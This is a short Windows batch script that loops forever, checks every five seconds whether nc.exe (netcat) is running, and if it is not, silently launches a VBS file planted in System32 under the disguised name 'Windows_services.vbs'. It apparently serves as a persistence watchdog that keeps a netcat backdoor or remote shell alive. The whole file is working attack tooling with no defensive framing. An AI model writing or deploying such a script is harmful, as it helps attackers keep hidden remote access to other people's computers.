@echo off
setlocal

set "processName=nc.exe"
set "scriptPath=C:\Windows\System32\Windows_services.vbs"
set "checkInterval=5"  REM in seconds (adjust as needed)

:CheckLoop
REM Check if nc.exe is running
tasklist | find /i "%processName%" > nul
if errorlevel 1 (
    REM Run your script silently
    start "" "%scriptPath%"

) else (
    REM Do nothing if nc.exe is already running
)

REM Wait for the specified interval before checking again
timeout /t %checkInterval% /nobreak > nul

REM Repeat the loop
goto CheckLoop

endlocal

